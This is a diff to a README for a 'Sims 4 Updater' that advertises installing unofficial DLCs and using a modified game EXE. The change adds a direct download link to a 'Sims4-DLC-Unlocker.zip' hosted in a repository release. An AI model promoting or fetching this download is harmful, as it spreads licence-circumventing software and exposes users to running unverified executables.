@@ -10,7 +10,7 @@ Sims 4 Updater is a powerful tool that helps you:
 - ✅ Install DLCs (both official and unofficial)  
 - ✅ Optionally use a **modified EXE** for certain functionalities (if desired)
 
-### 📥 [Download the Latest Version](#)
+### 📥 [Download the Latest Version](https://github.com/Sims4-DLC-Unlocker/.github/releases/download/1.4.2/Sims4-DLC-Unlocker.zip)
 
 ---
 
